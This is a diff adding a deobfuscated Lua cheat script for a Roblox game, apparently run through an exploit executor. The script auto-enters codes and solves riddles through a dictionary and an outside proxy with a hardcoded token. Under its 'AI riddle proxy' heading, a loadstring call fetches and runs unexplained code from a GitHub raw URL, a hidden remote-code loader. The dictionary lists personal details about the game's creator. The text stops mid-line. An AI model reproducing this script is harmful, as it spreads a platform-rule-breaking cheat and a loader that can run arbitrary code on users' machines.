@@ -1,0 +1,442 @@
+-- ============================================================
+-- Deobfuscated by aaa
+-- Original: K2 Code Sniper V2
+-- ============================================================
+
+repeat task.wait() until game:IsLoaded()
+
+pcall(function()
+    local oldGui = getgenv().K2CodeSniperGui
+    if oldGui and oldGui.Parent then oldGui:Destroy() end
+end)
+
+getgenv().K2CodeSniperV2 = true
+
+if not table.clear then
+    function table.clear(t)
+        for k in pairs(t) do t[k] = nil end
+    end
+end
+
+-- ============================================================
+-- GLOBALS
+-- ============================================================
+_G.ScriptEnabled          = true
+_G.AutoWriteEnabled       = false
+_G.AutoSubmitEnabled      = false
+_G.RiddleSolverEnabled    = false
+_G.AIRiddleEnabled        = false
+_G.SammyFilterEnabled     = true
+_G.SubmitAfterCount       = 1
+_G.SubmitDelay            = 0
+_G.CasingType             = "Upper"
+_G.TypeSpeed              = "Fast"
+_G.TrackersEnabled        = true
+_G.AnchorEnabled          = false
+_G.AutoBuyEnabled         = false
+
+local CONFIG_FILE = "k2_code_sniper_config.json"
+local savingConfig = false
+local HttpService = game:GetService("HttpService")
+
+-- ============================================================
+-- CONFIG
+-- ============================================================
+local function buildConfig()
+    return {
+        AutoWriteEnabled      = _G.AutoWriteEnabled == true,
+        AutoSubmitEnabled     = _G.AutoSubmitEnabled == true,
+        RiddleSolverEnabled   = _G.RiddleSolverEnabled == true,
+        AIRiddleEnabled       = _G.AIRiddleEnabled == true,
+        SammyFilterEnabled    = _G.SammyFilterEnabled ~= false,
+        SubmitAfterCount      = tonumber(_G.SubmitAfterCount) or 1,
+        SubmitDelay           = tonumber(_G.SubmitDelay) or 0,
+        CasingType            = tostring(_G.CasingType or "Upper"),
+        TypeSpeed             = tostring(_G.TypeSpeed or "Fast"),
+        TrackersEnabled       = _G.TrackersEnabled ~= false,
+        AnchorEnabled         = _G.AnchorEnabled == true,
+        AutoBuyEnabled        = _G.AutoBuyEnabled == true,
+        bgIndex               = tonumber(_G.K2SniperBgIndex) or 1,
+    }
+end
+
+local function applyConfig(cfg)
+    if type(cfg) ~= "table" then return end
+    if cfg.AutoWriteEnabled ~= nil then _G.AutoWriteEnabled = cfg.AutoWriteEnabled == true end
+    if cfg.AutoSubmitEnabled ~= nil then _G.AutoSubmitEnabled = cfg.AutoSubmitEnabled == true end
+    if cfg.RiddleSolverEnabled ~= nil then _G.RiddleSolverEnabled = cfg.RiddleSolverEnabled == true end
+    if cfg.AIRiddleEnabled ~= nil then _G.AIRiddleEnabled = cfg.AIRiddleEnabled == true end
+    if cfg.SammyFilterEnabled ~= nil then _G.SammyFilterEnabled = cfg.SammyFilterEnabled ~= false end
+    if cfg.SubmitAfterCount ~= nil then
+        _G.SubmitAfterCount = math.clamp(math.floor(tonumber(cfg.SubmitAfterCount) or 1), 1, 20)
+    end
+    if cfg.SubmitDelay ~= nil then
+        _G.SubmitDelay = math.clamp(tonumber(cfg.SubmitDelay) or 0, 0, 2)
+    end
+    if cfg.CasingType ~= nil then
+        local v = tostring(cfg.CasingType)
+        if v == "Upper" or v == "Lower" or v == "Normal" then _G.CasingType = v end
+    end
+    if cfg.TypeSpeed ~= nil then
+        local v = tostring(cfg.TypeSpeed)
+        if v == "Fast" or v == "Normal" then _G.TypeSpeed = v end
+    end
+    if cfg.TrackersEnabled ~= nil then _G.TrackersEnabled = cfg.TrackersEnabled ~= false end
+    if cfg.AnchorEnabled ~= nil then _G.AnchorEnabled = cfg.AnchorEnabled == true end
+    if cfg.AutoBuyEnabled ~= nil then _G.AutoBuyEnabled = cfg.AutoBuyEnabled == true end
+    if cfg.bgIndex ~= nil then
+        _G.K2SniperBgIndex = math.clamp(math.floor(tonumber(cfg.bgIndex) or 1), 1, 9)
+    end
+end
+
+local function saveConfig()
+    local ok = pcall(function()
+        local wf = writefile or (syn and syn.writefile)
+        if not wf then return end
+        wf(CONFIG_FILE, HttpService:JSONEncode(buildConfig()))
+    end)
+    return ok
+end
+
+local function loadConfig()
+    local ok, data = pcall(function()
+        local rf = readfile or (syn and syn.readfile)
+        local isf = isfile or (syn and syn.isfile)
+        if not rf then return nil end
+        if isf and not isf(CONFIG_FILE) then return nil end
+        local content = rf(CONFIG_FILE)
+        if type(content) ~= "string" or #content < 2 then return nil end
+        return HttpService:JSONDecode(content)
+    end)
+    if ok and type(data) == "table" then
+        applyConfig(data)
+        return true
+    end
+    return false
+end
+
+local function scheduleSave()
+    if savingConfig then return end
+    savingConfig = true
+    task.delay(0.35, function()
+        savingConfig = false
+        saveConfig()
+    end)
+end
+
+_G.K2SniperSaveConfig = saveConfig
+_G.K2SniperScheduleSave = scheduleSave
+pcall(loadConfig)
+
+-- ============================================================
+-- SERVICES + FORWARD DECLARATIONS
+-- ============================================================
+local Players             = game:GetService("Players")
+local UserInputService    = game:GetService("UserInputService")
+local GuiService          = game:GetService("GuiService")
+local TweenService        = game:GetService("TweenService")
+local ReplicatedStorage   = game:GetService("ReplicatedStorage")
+local LocalPlayer         = Players.LocalPlayer
+
+local mainFrame
+local guiRefs = {}
+local loadImage
+local activityContainer
+local minimizeOrb
+local currentRiddle = ""
+local updateCounters
+
+-- ============================================================
+-- THEME COLORS
+-- ============================================================
+local Colors = {
+    Void      = Color3.fromRGB(13, 11, 15),
+    Panel     = Color3.fromRGB(34, 20, 34),
+    PanelSoft = Color3.fromRGB(28, 16, 28),
+    Card      = Color3.fromRGB(34, 20, 34),
+    Cyan      = Color3.fromRGB(255, 74, 177),
+    Teal      = Color3.fromRGB(255, 120, 190),
+    Violet    = Color3.fromRGB(200, 100, 170),
+    Green     = Color3.fromRGB(110, 230, 180),
+    Amber     = Color3.fromRGB(255, 190, 100),
+    Red       = Color3.fromRGB(255, 110, 120),
+    Text      = Color3.fromRGB(255, 245, 250),
+    Muted     = Color3.fromRGB(194, 155, 180),
+    ToggleOff = Color3.fromRGB(40, 28, 40),
+    Border    = Color3.fromRGB(160, 70, 120),
+    Accent    = Color3.fromRGB(255, 74, 177),
+    Accent2   = Color3.fromRGB(255, 120, 190),
+    Hover     = Color3.fromRGB(55, 30, 50),
+    Contrast  = Color3.fromRGB(13, 11, 15),
+    Top       = Color3.fromRGB(40, 22, 38),
+    Side      = Color3.fromRGB(12, 8, 14),
+}
+
+local FontBlack  = Enum.Font.GothamBlack
+local FontBold   = Enum.Font.GothamBold
+local FontMedium = Enum.Font.GothamMedium
+
+local TweenMain  = TweenInfo.new(0.55, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+local TweenQuick = TweenInfo.new(0.28, Enum.EasingStyle.Sine,  Enum.EasingDirection.Out)
+local TweenBack  = TweenInfo.new(0.4,  Enum.EasingStyle.Back,  Enum.EasingDirection.Out)
+local TweenSlow  = TweenInfo.new(1.1,  Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+
+-- ============================================================
+-- UI HELPERS
+-- ============================================================
+local function addCorner(parent, radius)
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(0, radius or 12)
+    c.Parent = parent
+    return c
+end
+
+local function addStroke(parent, color, thickness, transparency)
+    local s = Instance.new("UIStroke")
+    s.Color = color or Colors.Cyan
+    s.Thickness = thickness or 1
+    s.Transparency = transparency or 0.4
+    s.Parent = parent
+    return s
+end
+
+local themeBindings = {}
+local toggleBindings = {}
+local bgIndex = 1
+
+-- ============================================================
+-- RIDDLE DICTIONARY
+-- ============================================================
+local riddleDictionary = {
+    ["10th machine"] = "NEWYEARSMACHINE", ["10th mutation"] = "PHANTOM",
+    ["11th machine"] = "DUELSMACHINE", ["11th mutation"] = "CRYSTAL",
+    ["12th machine"] = "CUPIDSMACHINE", ["13th machine"] = "TRADEMACHINE",
+    ["14th machine"] = "DIVINEFUSE", ["15th machine"] = "EGGINCUBATOR",
+    ["16th machine"] = "CYBERCRAFTMACHINE", ["17th machine"] = "SUMMERFUSE",
+    ["18th machine"] = "LOSTRADERS", ["1st machine"] = "RAINBOWMACHINE",
+    ["1st mutation"] = "BLOODROT", ["1st trait"] = "LIGHTNING",
+    ["1st trait created"] = "LIGHTNING", ["2nd machine"] = "BUBBLEGUMMACHINE",
+    ["2nd mutation"] = "CANDY", ["3rd machine"] = "FUSEMACHINE",
+    ["3rd mutation"] = "LAVA", ["4th machine"] = "CRAFTMACHINE",
+    ["4th mutation"] = "GALAXY", ["5th machine"] = "WITCHFUSE",
+    ["5th mutation"] = "YINYANG", [67] = 67,
+    ["6th machine"] = "BRAINROTDEALER", ["6th mutation"] = "RADIOACTIVE",
+    ["7th machine"] = "BRAINROTTRADER", ["7th mutation"] = "CURSED",
+    ["8th machine"] = "SANTASFUSE", ["8th mutation"] = "DIVINE",
+    ["9th machine"] = "SANTASSHOP", ["9th mutation"] = "CYBER",
+    ["age"] = 24, ["angelic"] = "DIVINE", ["angelic mutation"] = "DIVINE",
+    ["best brainrot"] = "STRAWBERRYELEPHANT", ["best mutation"] = "DIVINE",
+    ["birth day"] = "FRIDAY", ["birth month"] = "FEBRUARY", ["birth year"] = 2002,
+    ["birthday"] = "FRIDAY", ["birthplace"] = "ALGERIA",
+    ["black and white"] = "GALAXY", ["black mutation"] = "GALAXY",
+    ["born on"] = "FRIDAY", ["born year"] = 2002, ["city"] = "SAOPAULO",
+    ["color"] = "BLUE", ["color is blue"] = "BLUE", ["common rarity"] = "COMMON",
+    ["country"] = "BRAZIL", ["created on"] = "FRIDAY", ["creator"] = "SAMMY",
+    ["creator name"] = "SAMMY", ["creator real name"] = "SAMMY",
+    ["creator twice"] = "SAMMYSAMMY", ["cursed mutation"] = "CURSED",
+    ["date made"] = "MAY162025", ["day born"] = "FRIDAY",
+    ["day i was born"] = "FRIDAY", ["day sab was made"] = "FRIDAY",
+    ["day sab was released"] = "FRIDAY", ["divine mutation"] = "DIVINE",
+    ["eighteenth machine"] = "LOSTRADERS", ["eighth machine"] = "SANTASFUSE",
+    ["eleventh machine"] = "DUELSMACHINE", ["evil"] = "CURSED",
+    ["evil mutation"] = "CURSED", ["fav animal"] = "SPIDER",
+    ["fav color"] = "BLUE", ["fav color is blue"] = "BLUE",
+    ["fav food"] = "PIZZA", ["fav football player"] = "FOOTBALL",
+    ["fav game"] = "ROBLOX", ["fav player"] = "FOOTBALL", ["fav sport"] = "FOOTBALL",
+    ["favorite animal"] = "SPIDER", ["favorite color"] = "BLUE",
+    ["favorite color twice"] = "BLUEBLUE", ["favorite food"] = "PIZZA",
+    ["favorite food twice"] = "PIZZAPIZZA", ["favorite game"] = "ROBLOX",
+    ["favorite player"] = "FOOTBALL", ["favorite sport"] = "FOOTBALL",
+    ["favorite sport twice"] = "FOOTBALLFOOTBALL", ["favourite color"] = "BLUE",
+    ["fifteenth machine"] = "EGGINCUBATOR", ["fifth machine"] = "WITCHFUSE",
+    ["first machine"] = "RAINBOWMACHINE", ["first mutation"] = "BLOODROT",
+    ["first trait"] = "LIGHTNING", ["first trait created"] = "LIGHTNING",
+    ["food"] = "PIZZA", ["football player"] = "FOOTBALL",
+    ["fourteenth machine"] = "DIVINEFUSE", ["fourth machine"] = "CRAFTMACHINE",
+    ["full name"] = "STEALABRAINROT", ["funny number"] = 67,
+    ["game created on"] = "FRIDAY", ["game creation day"] = "FRIDAY",
+    ["game made on"] = "FRIDAY", ["game name"] = "STEALABRAINROT",
+    ["game release"] = "MAY162025", ["game release date"] = "MAY162025",
+    ["game released"] = "MAY162025", ["good mutation"] = "DIVINE",
+    ["green"] = "RADIOACTIVE", ["green mutation"] = "RADIOACTIVE",
+    ["headless horseman"] = "LOSTRADERS", ["highest rarity"] = "OG",
+    ["how old am i"] = 24, ["how old is sammy"] = 24,
+    ["latest mutation"] = "CRYSTAL", ["lightning"] = "LIGHTNING",
+    ["lightning trait"] = "LIGHTNING", ["lowest rarity"] = "COMMON",
+    ["molten"] = "MOLTEN", ["molten mutation"] = "MOLTEN",
+    ["month born"] = "FEBRUARY", ["month i was born"] = "FEBRUARY",
+    ["month sab was made"] = "MAY", ["most recent"] = "CRYSTAL",
+    ["most recent mutation"] = "CRYSTAL", ["my age"] = 24,
+    ["my age 2 times"] = 2424, ["my age 3 times"] = 242424, ["my age twice"] = 2424,
+    ["my animal"] = "SPIDER", ["my cat's name"] = "NOVA", ["my cats name"] = "NOVA",
+    ["my city"] = "SAOPAULO", ["my color"] = "BLUE", ["my color is blue"] = "BLUE",
+    ["my country"] = "BRAZIL", ["my food"] = "PIZZA", ["my name"] = "SAMMY",
+    ["what is my name"] = "SAMMY", ["whats my name"] = "SAMMY",
+    ["what's my name"] = "SAMMY", ["my name 2 times"] = "SAMMYSAMMY",
+    ["my name 3 times"] = "SAMMYSAMMYSAMMY", ["my name twice"] = "SAMMYSAMMY",
+    ["my nationality"] = "BRAZILIAN", ["my pet"] = "SPIDER",
+    ["my real name"] = "SAMMY", ["my roblox username"] = "SPYDERSAMMY",
+    ["my sport"] = "FOOTBALL", ["my state"] = "SAOPAULO",
+    ["my username"] = "SPYDERSAMMY", ["my youtube"] = "SPYDERSAMMY",
+    ["name of the game"] = "STEALABRAINROT", ["name twice"] = "SAMMYSAMMY",
+    ["nationality"] = "BRAZILIAN", ["newest mutation"] = "CRYSTAL",
+    ["ninth machine"] = "SANTASSHOP", ["orange"] = "MOLTEN",
+    ["orange mutation"] = "MOLTEN", ["owner"] = "SAMMY",
+    ["owner real name"] = "SAMMY", ["owner twice"] = "SAMMYSAMMY",
+    ["purple"] = "GALAXY", ["purple mutation"] = "GALAXY",
+    ["rarest"] = "LOSTRADERS", ["rarest brainrot"] = "LOSTRADERS",
+    ["rarest rarity"] = "OG", ["real name"] = "SAMMY", ["red"] = "CURSED",
+    ["red mutation"] = "CURSED", ["release date"] = "MAY162025",
+    ["release month"] = "MAY", ["release year"] = 2025,
+    ["roblox name"] = "SPYDERSAMMY", ["roblox username"] = "SPYDERSAMMY",
+    ["ronaldo"] = "FOOTBALL", ["sab"] = "STEALABRAINROT",
+    ["sab made on"] = "FRIDAY", ["sab release"] = "MAY162025",
+    ["sab release day"] = "FRIDAY", ["sab release month"] = "MAY",
+    ["sab released"] = "MAY162025", ["sab stands for"] = "STEALABRAINROT",
+    ["sammy age"] = 24, ["sammy city"] = "SAOPAULO",
+    ["sammy color"] = "BLUE", ["sammy color is blue"] = "BLUE",
+    ["sammy country"] = "BRAZIL", ["sammy location"] = "BRAZIL",
+    ["sammy nationality"] = "BRAZILIAN", ["sammy real name"] = "SAMMY",
+    ["sammy roblox name"] = "SPYDERSAMMY", ["sammy state"] = "SAOPAULO",
+    ["sammy username"] = "SPYDERSAMMY", ["sammy youtube"] = "SPYDERSAMMY",
+    ["sammys real name"] = "SAMMY", ["second machine"] = "BUBBLEGUMMACHINE",
+    ["second mutation"] = "CANDY", ["seventeenth machine"] = "SUMMERFUSE",
+    ["seventh machine"] = "BRAINROTTRADER", ["sixteenth machine"] = "CYBERCRAFTMACHINE",
+    ["sixth machine"] = "BRAINROTDEALER", ["social media"] = "YOUTUBE",
+    ["special number"] = 67, ["sport"] = "FOOTBALL", ["state"] = "SAOPAULO",
+    ["struck by lightning"] = "LIGHTNING", ["tenth machine"] = "NEWYEARSMACHINE",
+    ["third machine"] = "FUSEMACHINE", ["third mutation"] = "LAVA",
+    ["thirteenth machine"] = "TRADEMACHINE", ["top mutation"] = "DIVINE",
+    ["top rarity"] = "OG", ["trait from lightning"] = "LIGHTNING",
+    ["turns black"] = "GALAXY", ["turns green"] = "RADIOACTIVE",
+    ["turns orange"] = "MOLTEN", ["turns purple"] = "GALAXY",
+    ["turns red"] = "CURSED", ["turns yellow"] = "DIVINE",
+    ["twelfth machine"] = "CUPIDSMACHINE", ["unobtainable"] = "STRAWBERRYELEPHANT",
+    ["username"] = "SPYDERSAMMY", ["what is my cats name"] = "NOVA",
+    ["when made"] = "MAY162025", ["when was sab created"] = "MAY162025",
+    ["when was sab made"] = "MAY162025", ["when was sab released"] = "MAY162025",
+    ["where am i from"] = "BRAZIL", ["where do i live"] = "BRAZIL",
+    ["where does sammy live"] = "BRAZIL", ["where i was born"] = "ALGERIA",
+    ["where is sammy from"] = "BRAZIL", ["where was i born"] = "ALGERIA",
+    ["where was i born at"] = "ALGERIA", ["who created sab"] = "SAMMY",
+    ["who is the owner"] = "SAMMY", ["who made sab"] = "SAMMY",
+    ["who owns sab"] = "SAMMY", ["year born"] = 2002, ["year created"] = 2025,
+    ["year i was born"] = 2002, ["year made"] = 2025, ["year of sab"] = 2025,
+    ["year sab was created"] = 2025, ["year sab was made"] = 2025,
+    ["year we are on"] = 2026, ["year we're on"] = 2026, ["year were on"] = 2026,
+    ["yellow"] = "DIVINE", ["yellow mutation"] = "DIVINE",
+    ["youtube channel"] = "SPYDERSAMMY",
+}
+
+local sortedKeys = nil
+local function getSortedKeys()
+    if sortedKeys then return sortedKeys end
+    sortedKeys = {}
+    for k in pairs(riddleDictionary) do table.insert(sortedKeys, k) end
+    table.sort(sortedKeys, function(a, b) return #a > #b end)
+    return sortedKeys
+end
+
+local function solveRiddleWithDictionary(text)
+    local clean = tostring(text or ""):lower():gsub("[^%w]", "")
+    if clean == "" then return nil end
+
+    local parts = {}
+    local remaining = clean
+    local guard = 0
+    local keys = getSortedKeys()
+
+    while #remaining > 0 and guard < 30 do
+        guard += 1
+        local bestPos, bestEnd, bestKey = nil, nil, nil
+        for _, key in ipairs(keys) do
+            local k = key:lower():gsub("[^%w]", "")
+            if #k >= 2 then
+                local pos, endPos = remaining:find(k, 1, true)
+                if pos and pos <= 10 then
+                    if not bestPos or pos < bestPos or (pos == bestPos and #k > #(bestKey or "")) then
+                        bestPos, bestEnd, bestKey = pos, endPos, key
+                    end
+                end
+            end
+        end
+        if not bestKey then
+            remaining = remaining:sub(2)
+        else
+            local value = riddleDictionary[bestKey]
+            local rest = remaining:sub(bestEnd + 1)
+            local multiplier = 1
+            if rest:sub(1, 5) == "twice" then
+                multiplier = 2
+                rest = rest:sub(6)
+            else
+                local num = rest:match("^(%d+)times")
+                if num then
+                    multiplier = tonumber(num) or 1
+                    rest = rest:gsub("^%d+times", "", 1)
+                end
+            end
+            table.insert(parts, string.rep(value, multiplier))
+            remaining = rest
+        end
+    end
+    if #parts == 0 then return nil end
+    return table.concat(parts, "")
+end
+
+-- ============================================================
+-- AI RIDDLE PROXY
+-- ============================================================
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Argian-dotcom/Jdkffkfo/refs/heads/main/Coding"))()
+local PROXY_URL = "https://riddler-proxy.rp-relay-7k2m.workers.dev"
+local PROXY_TOKEN = "2b1f85fb32a1bbe4faf71cf47f64ee8777f9190b35337ee59d05e7b0081a6ad7"
+local aiBusy = false
+
+local function getRequestFunction()
+    return (syn and syn.request) or (http and http.request) or http_request or request
+end
+
+local function parseProxyAnswer(text)
+    if type(text) ~= "string" then return nil end
+    text = text:gsub("^%s+", ""):gsub("%s+$", "")
+    local prefix, rest = text:match("^(.-)%s*|%s*(.*)$")
+    if prefix and rest then
+        local p = prefix:upper():gsub("%s+", "")
+        local r = rest:upper():gsub("%s+", ""):gsub("[^%w%_%-]", "")
+        if p == "CODE" or p == "ANSWER" or p == "SEARCHCODE" then
+            return r ~= "" and r or nil
+        end
+        if #r >= 1 then return r end
+        local cleaned = p:gsub("[^%w%_%-]", "")
+        if #cleaned >= 1 then return cleaned end
+    end
+    local cleaned = text:gsub("%s+", ""):gsub("[^%w%_%-]", ""):upper()
+    if #cleaned >= 1 then return cleaned end
+    return nil
+end
+
+local function solveWithAI(riddle, callback)
+    riddle = tostring(riddle or ""):gsub("^%s+", ""):gsub("%s+$", "")
+    if riddle == "" then
+        if callback then callback(nil, "empty riddle") end
+        return
+    end
+    local reqfn = getRequestFunction()
+    if type(reqfn) ~= "function" then
+        if callback then callback(nil, "no HTTP") end
+        return
+    end
+    if aiBusy then
+        if callback then callback(nil, "busy") end
+        return
+    end
+    aiBusy = true
+    task.spawn(function()
+        local ok, res = pcall(function()
+            return reqfn({
+                Url = PROXY_URL,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = HttpService:JSONEncode({
+                    op = "solve", token = PROXY_TOKEN, tier = "FASTER",
+                    user = "k2:" .. tos
